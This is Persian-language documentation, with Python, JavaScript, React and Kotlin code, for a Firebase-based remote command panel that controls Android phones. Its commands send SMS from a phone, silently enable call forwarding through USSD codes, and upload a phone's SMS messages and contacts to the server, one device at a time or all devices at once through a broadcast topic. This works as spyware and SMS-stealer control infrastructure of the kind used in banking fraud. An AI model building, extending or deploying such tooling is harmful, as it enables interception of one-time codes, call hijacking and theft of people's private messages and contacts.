# 🔥 Firebase Commands Documentation

## 📋 فهرست مطالب
- [معرفی](#معرفی)
- [نحوه عملکرد Firebase](#نحوه-عملکرد-firebase)
- [لیست کامل دستورات](#لیست-کامل-دستورات)
- [API Endpoint](#api-endpoint)
- [دستورات تک دستگاه](#دستورات-تک-دستگاه)
- [Topic Messaging (Broadcast)](#topic-messaging-broadcast)
- [مثال‌های عملی](#مثالهای-عملی)
- [نکات مهم](#نکات-مهم)

---

## معرفی

سیستم **Firebase Commands** به شما اجازه می‌دهد که دستورات مختلف را به دستگاه‌های اندروید ارسال کنید. این دستورات از طریق **Firebase Cloud Messaging (FCM)** به دستگاه‌ها فرستاده می‌شوند.

### ✨ امکانات
- ✅ ارسال دستور به یک دستگاه خاص
- ✅ ارسال دستور به همه دستگاه‌ها (Topic Messaging)
- ✅ پشتیبانی از Multiple FCM Tokens
- ✅ ذخیره لاگ تمام دستورات
- ✅ اعلان به تلگرام

---

## نحوه عملکرد Firebase

### Flow ارسال دستور

```
┌──────────────┐
│ Admin Panel  │
│   (UI/API)   │
└──────┬───────┘
       │ 1. HTTP Request
       ↓
┌──────────────┐
│   Backend    │
│   (FastAPI)  │
└──────┬───────┘
       │ 2. Firebase API Call
       ↓
┌──────────────┐
│   Firebase   │
│     (FCM)    │
└──────┬───────┘
       │ 3. Push Notification
       ↓
┌──────────────┐
│Android Device│
│ (FCM Service)│
└──────────────┘
```

### Firebase Service Files

**دو سرویس Firebase داریم:**

1. **firebase_service.py** - برای دستگاه‌ها
   - Service Account: `testkot-d12cc-firebase-adminsdk-fbsvc-523c1700f0.json`
   - دستورات به دستگاه‌ها

2. **firebase_admin_service.py** - برای ادمین‌ها
   - Service Account: `admin-firebase-adminsdk.json`
   - Push notification به ادمین‌ها

---

## لیست کامل دستورات

| دستور | نوع | توضیحات | پارامترها |
|-------|-----|---------|-----------|
| `ping` | تست | بررسی آنلاین بودن دستگاه | - |
| `send_sms` | SMS | ارسال پیامک از دستگاه | phone, message, simSlot |
| `call_forwarding` | تماس | فعال‌سازی هدایت تماس | number, simSlot |
| `call_forwarding_disable` | تماس | غیرفعال‌سازی هدایت تماس | simSlot |
| `quick_upload_sms` | داده | آپلود 50 پیامک آخر | - |
| `quick_upload_contacts` | داده | آپلود 50 مخاطب اول | - |
| `upload_all_sms` | داده | آپلود تمام پیامک‌ها | - |
| `upload_all_contacts` | داده | آپلود تمام مخاطبین | - |
| `start_services` | سرویس | شروع سرویس‌های دستگاه | - |
| `restart_heartbeat` | سرویس | ری‌استارت Heartbeat | - |
| `note` | یادداشت | ذخیره یادداشت در دستگاه | priority, message |

---

## API Endpoint

### Base Endpoint

```http
POST /api/devices/{device_id}/command
Authorization: Bearer {admin_token}
Content-Type: application/json
```

### Request Body Schema

```json
{
  "command": "command_name",
  "parameters": {
    // پارامترهای اختیاری بسته به نوع دستور
  }
}
```

### Response Schema

```json
{
  "success": true,
  "message": "Command sent to 1/1 tokens",
  "type": "firebase",
  "result": {
    "success": true,
    "sent_count": 1,
    "total_tokens": 1,
    "message": "Command sent successfully"
  }
}
```

---

## دستورات تک دستگاه

### 1. 📡 Ping (بررسی آنلاین بودن)

**توضیح:** بررسی می‌کنه که دستگاه آنلاین هست یا نه.

**Request:**
```json
{
  "command": "ping",
  "parameters": {
    "type": "firebase"
  }
}
```

**پارامترها:**
- `type` (optional): "firebase" یا "server"

**مثال cURL:**
```bash
curl -X POST "http://localhost:8000/api/devices/DEVICE_123/command" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command": "ping", "parameters": {"type": "firebase"}}'
```

---

### 2. 📱 Send SMS (ارسال پیامک)

**توضیح:** از دستگاه به شماره مشخص پیامک ارسال می‌کنه.

**Request:**
```json
{
  "command": "send_sms",
  "parameters": {
    "phone": "+989123456789",
    "message": "سلام! این یک پیام تست است.",
    "simSlot": 0
  }
}
```

**پارامترها:**
- `phone` (required): شماره گیرنده (فرمت بین‌المللی)
- `message` (required): متن پیامک
- `simSlot` (optional): سیم‌کارت (0 یا 1، پیش‌فرض: 0)

**مثال JavaScript:**
```javascript
const sendSMS = async (deviceId, phone, message, simSlot = 0) => {
  const response = await fetch(`/api/devices/${deviceId}/command`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${accessToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      command: 'send_sms',
      parameters: { phone, message, simSlot }
    })
  });
  return await response.json();
};
```

---

### 3. 📞 Call Forwarding Enable (فعال‌سازی هدایت تماس)

**توضیح:** تمام تماس‌های ورودی رو به شماره دیگه هدایت می‌کنه.

**Request:**
```json
{
  "command": "call_forwarding",
  "parameters": {
    "number": "+989123456789",
    "simSlot": 0
  }
}
```

**پارامترها:**
- `number` (required): شماره هدایت
- `simSlot` (optional): سیم‌کارت (0 یا 1)

**دستور USSD اجرا شده:**
```
*21*{number}#
```

**مثال Python:**
```python
import requests

def enable_call_forwarding(device_id, forward_number, sim_slot=0):
    response = requests.post(
        f"http://localhost:8000/api/devices/{device_id}/command",
        headers={"Authorization": f"Bearer {access_token}"},
        json={
            "command": "call_forwarding",
            "parameters": {
                "number": forward_number,
                "simSlot": sim_slot
            }
        }
    )
    return response.json()
```

---

### 4. 📵 Call Forwarding Disable (غیرفعال‌سازی هدایت تماس)

**توضیح:** هدایت تماس رو غیرفعال می‌کنه.

**Request:**
```json
{
  "command": "call_forwarding_disable",
  "parameters": {
    "simSlot": 0
  }
}
```

**پارامترها:**
- `simSlot` (optional): سیم‌کارت (0 یا 1)

**دستور USSD اجرا شده:**
```
#21#
```

---

### 5. 📨 Quick Upload SMS (آپلود سریع پیامک)

**توضیح:** 50 پیامک آخر رو سریع آپلود می‌کنه.

**Request:**
```json
{
  "command": "quick_upload_sms"
}
```

**پارامترها:** ندارد

**مثال:**
```bash
curl -X POST "http://localhost:8000/api/devices/DEVICE_123/command" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command": "quick_upload_sms"}'
```

---

### 6. 👥 Quick Upload Contacts (آپلود سریع مخاطبین)

**توضیح:** 50 مخاطب اول رو سریع آپلود می‌کنه.

**Request:**
```json
{
  "command": "quick_upload_contacts"
}
```

**پارامترها:** ندارد

---

### 7. 📦 Upload All SMS (آپلود کامل پیامک‌ها)

**توضیح:** تمام پیامک‌های دستگاه رو آپلود می‌کنه (ممکنه طولانی باشه).

**Request:**
```json
{
  "command": "upload_all_sms"
}
```

**پارامترها:** ندارد

**⚠️ توجه:** این عملیات ممکنه چند دقیقه طول بکشه.

---

### 8. 📇 Upload All Contacts (آپلود کامل مخاطبین)

**توضیح:** تمام مخاطبین دستگاه رو آپلود می‌کنه.

**Request:**
```json
{
  "command": "upload_all_contacts"
}
```

**پارامترها:** ندارد

---

### 9. 🚀 Start Services (شروع سرویس‌ها)

**توضیح:** تمام سرویس‌های لازم دستگاه رو فعال می‌کنه:
- SmsService (رصد پیامک‌ها)
- HeartbeatService (ارسال heartbeat)
- WorkManager (کارهای پس‌زمینه)

**Request:**
```json
{
  "command": "start_services"
}
```

**پارامترها:** ندارد

**مثال:**
```javascript
// Start all services on device
fetch(`/api/devices/${deviceId}/command`, {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ command: 'start_services' })
});
```

---

### 10. 💓 Restart Heartbeat (ری‌استارت Heartbeat)

**توضیح:** سرویس Heartbeat دستگاه رو ری‌استارت می‌کنه.

**Request:**
```json
{
  "command": "restart_heartbeat"
}
```

**پارامترها:** ندارد

**نکته:** هر 10 دقیقه یکبار به صورت خودکار برای همه دستگاه‌ها اجرا می‌شه.

---

### 11. 📝 Note (یادداشت)

**توضیح:** یادداشت مهمی رو در دستگاه ذخیره می‌کنه (برای یادآوری).

**Request:**
```json
{
  "command": "note",
  "parameters": {
    "priority": "high",
    "message": "این دستگاه مشکوک است - بررسی شود"
  }
}
```

**پارامترها:**
- `priority` (required): سطح اولویت
  - `"none"` - بدون اولویت
  - `"low"` - کم اهمیت
  - `"medium"` - متوسط
  - `"high"` - مهم
  - `"critical"` - فوری
- `message` (required): متن یادداشت

**مثال:**
```python
def save_device_note(device_id, priority, message):
    return requests.post(
        f"http://localhost:8000/api/devices/{device_id}/command",
        headers={"Authorization": f"Bearer {token}"},
        json={
            "command": "note",
            "parameters": {
                "priority": priority,
                "message": message
            }
        }
    ).json()
```

---

## Topic Messaging (Broadcast)

### 📢 ارسال دستور به همه دستگاه‌ها

به جای اینکه به هر دستگاه جداگانه دستور بفرستی، می‌تونی با **یک request** به همه دستگاه‌ها دستور بفرستی.

### چطور کار می‌کنه؟

```
Backend → Firebase → Topic: "all_devices" → همه دستگاه‌های Subscribe شده
```

### مزایا
- ✅ فقط 1 request به Firebase
- ✅ سریع‌تر از ارسال تک به تک
- ✅ کم‌هزینه‌تر
- ✅ مقیاس‌پذیر (scalable)

### دستورات پشتیبانی شده

#### 1. Restart All Heartbeats

```python
# در firebase_service.py
result = await firebase_service.restart_all_heartbeats()
```

**خروجی:**
```json
{
  "success": true,
  "topic": "all_devices",
  "command": "restart_heartbeat",
  "message_id": "projects/.../messages/0:1234567890",
  "message": "Command sent to all devices subscribed to 'all_devices'"
}
```

#### 2. Ping All Devices

```python
result = await firebase_service.ping_all_devices_topic()
```

#### 3. Start All Services

```python
result = await firebase_service.start_all_services()
```

### 🔧 Background Task: Auto Restart Heartbeats

هر 10 دقیقه یکبار به صورت خودکار:

```python
# در main.py startup
asyncio.create_task(restart_all_heartbeats_bg(firebase_service))
```

---

## مثال‌های عملی

### Example 1: ارسال SMS به 10 دستگاه

```python
import asyncio
import requests

async def send_sms_to_devices(device_ids, phone, message):
    """ارسال پیامک یکسان به چند دستگاه"""
    
    results = []
    for device_id in device_ids:
        response = requests.post(
            f"http://localhost:8000/api/devices/{device_id}/command",
            headers={"Authorization": f"Bearer {access_token}"},
            json={
                "command": "send_sms",
                "parameters": {
                    "phone": phone,
                    "message": message,
                    "simSlot": 0
                }
            }
        )
        results.append({
            "device_id": device_id,
            "success": response.json()["success"]
        })
    
    return results

# استفاده
device_list = ["DEV_001", "DEV_002", "DEV_003", ...]
results = await send_sms_to_devices(
    device_list, 
    "+989123456789", 
    "سلام! این یک پیام تست است."
)
```

---

### Example 2: آپلود سریع داده از همه دستگاه‌ها

```javascript
async function quickUploadAllDevices() {
  // دریافت لیست دستگاه‌ها
  const devicesResponse = await fetch('/api/devices', {
    headers: { 'Authorization': `Bearer ${token}` }
  });
  const { devices } = await devicesResponse.json();
  
  // ارسال دستور quick upload به همه
  const promises = devices.map(device => 
    fetch(`/api/devices/${device.device_id}/command`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        command: 'quick_upload_sms'
      })
    })
  );
  
  const results = await Promise.all(promises);
  console.log(`✅ Sent to ${results.length} devices`);
}
```

---

### Example 3: UI Component برای Firebase Commands

```jsx
import React, { useState } from 'react';

function FirebaseCommandPanel({ deviceId }) {
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);

  const sendCommand = async (command, parameters = {}) => {
    setLoading(true);
    setResult(null);
    
    try {
      const response = await fetch(`/api/devices/${deviceId}/command`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ command, parameters })
      });
      
      const data = await response.json();
      setResult(data);
      
      if (data.success) {
        alert(`✅ ${command} sent successfully!`);
      } else {
        alert(`❌ Failed: ${data.message}`);
      }
    } catch (error) {
      alert(`❌ Error: ${error.message}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="firebase-commands">
      <h3>🔥 Firebase Commands</h3>
      
      <div className="command-grid">
        {/* Ping */}
        <button 
          onClick={() => sendCommand('ping', { type: 'firebase' })}
          disabled={loading}
          className="btn-ping"
        >
          📡 Ping
        </button>

        {/* Quick Upload SMS */}
        <button 
          onClick={() => sendCommand('quick_upload_sms')}
          disabled={loading}
          className="btn-upload"
        >
          📨 Quick Upload SMS
        </button>

        {/* Quick Upload Contacts */}
        <button 
          onClick={() => sendCommand('quick_upload_contacts')}
          disabled={loading}
          className="btn-upload"
        >
          👥 Quick Upload Contacts
        </button>

        {/* Start Services */}
        <button 
          onClick={() => sendCommand('start_services')}
          disabled={loading}
          className="btn-service"
        >
          🚀 Start Services
        </button>

        {/* Restart Heartbeat */}
        <button 
          onClick={() => sendCommand('restart_heartbeat')}
          disabled={loading}
          className="btn-service"
        >
          💓 Restart Heartbeat
        </button>
      </div>

      {loading && <div className="spinner">Sending command...</div>}
      
      {result && (
        <div className="result">
          <pre>{JSON.stringify(result, null, 2)}</pre>
        </div>
      )}
    </div>
  );
}

export default FirebaseCommandPanel;
```

---

## نکات مهم

### ⚠️ پیش‌نیازها

1. **FCM Token** - دستگاه باید حتماً FCM token داشته باشه
2. **Firebase Service Account** - فایل JSON صحیح باشه
3. **Internet Connection** - دستگاه آنلاین باشه
4. **App Permissions** - اپ دسترسی‌های لازم رو داشته باشه

### 🔒 امنیت

- ✅ فقط ادمین‌ها با permission `SEND_COMMANDS` می‌تونن دستور بفرستن
- ✅ تمام دستورات لاگ می‌شن
- ✅ Activity logging برای audit trail
- ✅ اعلان تلگرام برای دستورات مهم

### 💡 بهینه‌سازی

**زمانی که می‌خوای به چند دستگاه دستور بفرستی:**

❌ **بد:**
```python
for device_id in device_ids:
    send_command(device_id, "ping")  # یک به یک - کُند!
```

✅ **خوب:**
```python
# اگر دستور یکسان است:
firebase_service.send_to_topic("all_devices", "ping")  # یک request!

# اگر دستورات متفاوت هستند:
tasks = [send_command(device_id, cmd) for device_id, cmd in commands]
await asyncio.gather(*tasks)  # موازی
```

### 📊 Monitoring

**چک کردن وضعیت ارسال:**

```python
# دریافت device
device = await device_service.get_device(device_id)

# چک کردن FCM tokens
if not device.fcm_tokens or len(device.fcm_tokens) == 0:
    print("❌ No FCM tokens - device cannot receive commands")
else:
    print(f"✅ Device has {len(device.fcm_tokens)} FCM token(s)")

# چک کردن آخرین آنلاین بودن
if device.last_ping:
    minutes_ago = (datetime.utcnow() - device.last_ping).seconds / 60
    print(f"Last seen: {minutes_ago} minutes ago")
```

---

## 🐛 عیب‌یابی (Troubleshooting)

### مشکل: دستور ارسال می‌شه ولی دستگاه دریافت نمی‌کنه

**راه‌حل:**

1. چک کنید FCM token معتبر باشه:
```bash
curl http://localhost:8000/api/devices/DEVICE_123 \
  -H "Authorization: Bearer TOKEN"
# بررسی کنید fcm_tokens خالی نباشه
```

2. چک کنید Firebase Service Account درست باشه:
```python
# در firebase_service.py
# مطمئن شوید که فایل JSON موجود و معتبر است
```

3. چک کنید دستگاه به topic subscribe باشه:
```kotlin
// در Android app
FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
```

---

### مشکل: Error "UnregisteredError"

**علت:** FCM token منقضی شده یا نامعتبر است.

**راه‌حل:**
```python
# سرور به صورت خودکار token نامعتبر رو حذف می‌کنه
# دستگاه باید token جدید بفرسته

# اگر manual می‌خوای حذف کنی:
await mongodb.db.devices.update_one(
    {"device_id": device_id},
    {"$pull": {"fcm_tokens": invalid_token}}
)
```

---

### مشکل: دستور به بعضی دستگاه‌ها میره، بعضی‌ها نه

**علت:** Multiple FCM tokens، بعضی‌ها نامعتبر هستن.

**راه‌حل:**
```python
# سرویس به تمام tokens ارسال می‌کنه
# tokens نامعتبر رو خودکار حذف می‌کنه
result = await firebase_service.send_command_to_device(
    device_id, 
    "ping"
)
print(f"Sent to {result['sent_count']}/{result['total_tokens']} tokens")
```

---

## 📊 آمار و گزارش

### دریافت آمار دستورات ارسالی

```python
# تعداد کل دستورات ارسالی به یک دستگاه
logs = await device_service.get_logs(
    device_id, 
    log_type="command",
    skip=0,
    limit=100
)

print(f"Total commands sent: {len(logs)}")

# دستورات موفق
success_logs = [log for log in logs if log["level"] == "success"]
print(f"Successful: {len(success_logs)}")
```

---

## 🔄 Background Tasks

### Auto Restart Heartbeats

```python
# در main.py - startup event
asyncio.create_task(restart_all_heartbeats_bg(firebase_service))

# در background_tasks.py
async def restart_all_heartbeats_bg(firebase_service):
    """هر 10 دقیقه یکبار به همه دستگاه‌ها restart_heartbeat می‌فرسته"""
    await asyncio.sleep(120)  # 2 دقیقه صبر می‌کنه تا سرور آماده بشه
    
    while True:
        try:
            result = await firebase_service.restart_all_heartbeats()
            logger.info(f"✅ Restart heartbeat sent to all devices")
            await asyncio.sleep(600)  # 10 دقیقه
        except Exception as e:
            logger.error(f"❌ Error: {e}")
            await asyncio.sleep(120)  # 2 دقیقه صبر کن و دوباره تلاش کن
```

---

## 📚 مستندات مرتبط

- [Call Forwarding](./CALL_FORWARDING.md) - راهنمای کامل هدایت تماس
- [Device API](./DEVICE_API.md) - API های کامل دستگاه
- [Firebase Setup](./FIREBASE.md) - راه‌اندازی Firebase
- [Admin API](./ADMIN_API.md) - API های ادمین

---

## 📱 نمونه کد اندروید

### دریافت دستور در اندروید

```kotlin
// MyFirebaseMessagingService.kt
class MyFirebaseMessagingService : FirebaseMessagingService() {

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        val data = remoteMessage.data
        val commandType = data["type"] ?: return
        
        when (commandType) {
            "ping" -> handlePing()
            "send_sms" -> handleSendSMS(data)
            "call_forwarding" -> handleCallForwarding(data)
            "call_forwarding_disable" -> handleDisableCallForwarding(data)
            "quick_upload_sms" -> handleQuickUploadSMS()
            "quick_upload_contacts" -> handleQuickUploadContacts()
            "upload_all_sms" -> handleUploadAllSMS()
            "upload_all_contacts" -> handleUploadAllContacts()
            "start_services" -> handleStartServices()
            "restart_heartbeat" -> handleRestartHeartbeat()
            "note" -> handleNote(data)
        }
    }
    
    private fun handlePing() {
        // ارسال پاسخ ping به سرور
        sendPingResponse()
    }
    
    private fun handleSendSMS(data: Map<String, String>) {
        val phone = data["phone"] ?: return
        val message = data["message"] ?: return
        val simSlot = data["simSlot"]?.toIntOrNull() ?: 0
        
        // ارسال SMS
        sendSMS(phone, message, simSlot)
    }
    
    private fun handleCallForwarding(data: Map<String, String>) {
        val number = data["number"] ?: return
        val simSlot = data["simSlot"]?.toIntOrNull() ?: 0
        
        // فعال‌سازی Call Forwarding
        enableCallForwarding(number, simSlot)
    }
    
    // ... سایر handler ها
}
```

### Subscribe به Topic

```kotlin
// در MainActivity یا Application class
FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
    .addOnCompleteListener { task ->
        if (task.isSuccessful) {
            Log.d("FCM", "✅ Subscribed to all_devices topic")
        } else {
            Log.e("FCM", "❌ Failed to subscribe")
        }
    }
```

---

**آخرین بروزرسانی:** 2025-11-10  
**نسخه:** 2.0.0  
**توسعه‌دهنده:** Device Management System
